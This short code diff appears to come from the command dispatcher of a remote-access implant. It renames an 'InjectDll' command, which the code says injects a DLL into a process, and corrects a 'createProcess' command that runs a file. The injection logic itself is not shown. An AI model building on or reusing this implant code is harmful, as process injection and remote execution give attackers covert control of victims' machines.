@@ -148,7 +148,7 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
 
 
     /* Enjects dll to process*/
-    if (command.compare("InjectDll") == 0){
+    if (command.compare("injectDll") == 0){
         try{
             std::istringstream ss(args);
             std::wstring process;
@@ -163,7 +163,7 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
     }
 
     /* execute a file*/
-    if (command.compare("InjectDll") == 0){
+    if (command.compare("createProcess") == 0){
         try{
             std::istringstream ss(args);
             std::string path;
